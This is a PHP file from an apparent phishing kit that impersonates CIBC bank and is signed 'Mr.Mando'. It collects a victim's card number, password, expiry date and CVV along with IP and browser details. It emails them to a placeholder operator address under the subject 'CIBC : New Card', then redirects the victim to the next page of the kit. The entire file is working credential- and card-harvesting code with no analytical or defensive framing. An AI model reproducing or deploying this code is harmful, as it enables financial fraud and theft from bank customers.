<?php

error_reporting(0);
session_start();
$ip = $_SERVER["REMOTE_ADDR"];
$_SESSION['_IP_'] = $_SERVER["REMOTE_ADDR"];

#browser info
$browser = $user_browser." - ".$user_os." - ".substr($_SERVER['HTTP_ACCEPT_LANGUAGE'], 0,5);

#Country info
$_SESSION['cntcode'] = $countrycode;
$_SESSION['cntname'] = $countryname;


$_SESSION['edmonth'] = $_POST['2'];
$_SESSION['edyear'] = $_POST['3'];
$_SESSION['cvn'] = $_POST['4'];


#Security information

$message = "
___________________________________________________________________
<br />
IP              =>   <font color='#F31414'>".$_SESSION['_IP_']."</font>
<br />
TIME            =>   <font color='#F31414'>".date('l jS \of F Y h:i:s A')."</font><br />
BROWSER         =>   <font color='#F31414'>".$browser."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
The Login :
Card Number : =>   <font color='#F31414'>".$_SESSION['card']."</font><br />
Password : =>   <font color='#F31414'>".$_SESSION['password']."</font><br />
<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
CARD NUMBER     =>   <font color='#F31414'>".$_SESSION['card']."</font><br />
EXPIRATION DATE =>   <font color='#F31414'>".$_POST['2']."-".$_POST['3']."</font><br />
CVV / CVC       =>   <font color='#F31414'>".$_POST['4']."</font><br />

<hr style='border: 0;border-bottom: 1px solid #06F;background: #999;'/>
___________________________________________________________________
<br />
||~~ BY ~~ Mr.Mando ~~||
<br />

";

$subject  = " CIBC :  New Card-  [ " . $_SESSION['_IP_'] . " - " . $_SESSION['cntname'] . " ] ";
$headers  = "MIME-Version: 1.0" . "\r\n";;
$headers .= "Content-type:text/html;charset=UTF-8" . "\r\n";
$headers .= "From: Mr.Mando" . "\r\n";
$to = "YOUR_EMAIL";
@mail($to,$subject,$message,$headers);


 header("location:../infos.php");



		  ?>
